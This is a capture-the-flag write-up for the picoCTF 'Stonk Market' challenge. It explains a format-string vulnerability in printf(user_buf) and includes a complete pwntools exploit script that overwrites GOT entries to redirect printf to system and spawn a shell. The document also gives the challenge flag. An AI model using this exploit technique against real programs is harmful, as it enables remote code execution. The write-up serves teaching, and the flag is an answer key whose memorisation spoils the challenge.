# Stonk Market

## Description

Author: madStacks

I've learned my lesson, no more reading my API key into memory. Now there's no useful information you can leak! vuln vuln.c Makefile nc mercury.picoctf.net 38163

## Challenge

This challenge is similar to Stonks from earlier, except the flag is not on the stack and we are given a binary in addition to source code.

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### Relevant source code

```c
int buy_stonks(Portfolio *p) {
	if (!p) {
		return 1;
	}
	/*
	char api_buf[FLAG_BUFFER];
	FILE *f = fopen("api","r");
	if (!f) {
		printf("Flag file not found\n");
		exit(1);
	}
	fgets(api_buf, FLAG_BUFFER, f);
	*/
	int money = p->money;
	int shares = 0;
	Stonk *temp = NULL;
	printf("Using patented AI algorithms to buy stonks\n");
	while (money > 0) {
		shares = (rand() % money) + 1;
		temp = pick_symbol_with_AI(shares);
		temp->next = p->head;
		p->head = temp;
		money -= shares;
	}
	printf("Stonks chosen\n");

	char *user_buf = malloc(300 + 1);
	printf("What is your API token?\n");
	scanf("%300s", user_buf);
	printf("Buying stonks with token:\n");
	printf(user_buf);

	// TODO: Actually use key to interact with API

	view_portfolio(p);

	return 0;
}
```

## Solution

As the user input string is stored in the heap, we have very little control over the stack.

Nothing we can overwrite in the heap is useful, as the top qword of each chunk is either the number of shares and the stonk symbol, which are printed in a safe manner, or the amount of money we have, which is never referenced after the format string vulnerability.

To write somewhere with the format string vulnerability, we therefore have to take advantage of pointers already on the stack or in the approrpriate registers.

Since the `buy_stonks` function was called from main, we do have a saved `RBP` on the stack, which points to another stack address.
We can use the saved `RBP` to overwrite this stack address, then use the newly written address to overwrite a GOT entry and redirect program execution.

When referencing the second address, it is important that we do not use the parameter field `n$`, as `printf` behaves differently when this is present.

Normally, with `%x` or similar, `printf` directly reads or modifies from the existing item on the stack.
However, with `%3$x`, `printf` will create an internal copy of the item.
When writing and reading from the same address in `printf`, we need the variable modified directly, so the new value can be used during the same `printf` call.

We first overwrite the `GOT` address of `exit` to point somewhere that will lead us back to the format string vulnerability.
By overwriting it with `main`, we can grow the stack by a single stack frame with each loop, allowing us to store old addresses on the stack and easily reference them during the final stage of the exploit.

While functions other than `exit` may also work, `exit` is in an ideal location as our stack is reset to the level of `main`, allowing us to keep the stack size somewhat controlled.
The function we choose also needs to have not been called, as this allows us to overwrite only the last 2 bytes to change its GOT entry.
This is essential, as we cannot easily split our writes into short writes due to the limitations.

Once we have a loop around `main` and `buy_stonks`, we can start storing addresses on the stack for later use.
Now we can set up a group of short writes by storing the same address 4 times, offset by 2 bytes each time so the write occurs in a different part of the qword.
Using this technique, overwriting an existing GOT entry becomes 4 writes, each 2 bytes long, rather than a single 8 byte long write.

With the addresses set up, we can overwrite the GOT entry for `printf` so it points at the PLT for `system`.
This means that from this point on, when `printf` is called, its arguments are instead passed to `system`.
Next time we are prompted to enter our api token, we can enter the shell command we want to execute.
Here, typing `/bin/sh` will spawn a shell.

## Exploit

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host mercury.picoctf.net --port 58503 vuln
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('vuln')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'mercury.picoctf.net'
port = int(args.PORT or 38163)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    p = process([exe.path] + argv, *a, **kw)

    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)

    return p

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
context.terminal=['tmux','splitw','-h']
gdbscript = '''
set follow-fork-mode parent
b*0x00400ac9
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

io.recvuntil("portfolio\n")
io.sendline("1")

system = 0x004006f0
free = 0x00602018
printf = 0x00602038
exit = 0x00602068
main = 0x00400b95

got = exit
target = main

testStr = ""
testStr += "%.0s" * 10
testStr += "%{}x".format(printf)
testStr += "%12$lln"
testStr += "%.0s" * 1

formatStr = ""
written = 0

formatStr += "%16x" * 10
written += 16 * 10

formatStr += "%{}x".format(got - written)
formatStr += "%ln"
written = got

formatStr += "%16x" * 6
written += 16 * 6

formatStr += "%{}x".format(((target % 0x10000) - (written % 0x10000)) % 0x10000)

#formatStr += "---%p"
formatStr += "%hn"

print(formatStr)

pause()

io.recvuntil("token?\n")
#io.sendline('%12$p')
#io.sendline(testStr)
io.sendline(formatStr)

# print(io.recvuntil("portfolio\n").decode())



def buildStack(addr):
    formatStr = ""
    written = 0

    formatStr += "%16x" * 10
    written += 16 * 10
    formatStr += "%{}x".format(addr - written)
    formatStr += "%ln"

    io.recvuntil("portfolio\n")
    io.sendline("1")
    io.recvuntil("token?\n")
    io.sendline(formatStr)


buildStack(printf)
buildStack(printf + 2)
buildStack(printf + 4)
buildStack(printf + 6)


formatStr = ""
written = 0

formatStr += "%28$hn"
formatStr += "%36$hn"
formatStr += "%{}x".format(0x40)
formatStr += "%44$hn"
formatStr += "%{}x".format(0x6f0 - 0x40)
formatStr += "%52$hn"

io.recvuntil("portfolio\n")
io.sendline("1")
io.recvuntil("token?\n")
io.sendline(formatStr)

io.recvuntil("portfolio\n")
io.sendline("1")
io.recvuntil("token?\n")
io.sendline("/bin/sh")
io.interactive()
```

## Flag

`picoCTF{explo1t_m1t1gashuns_d67d2898}`

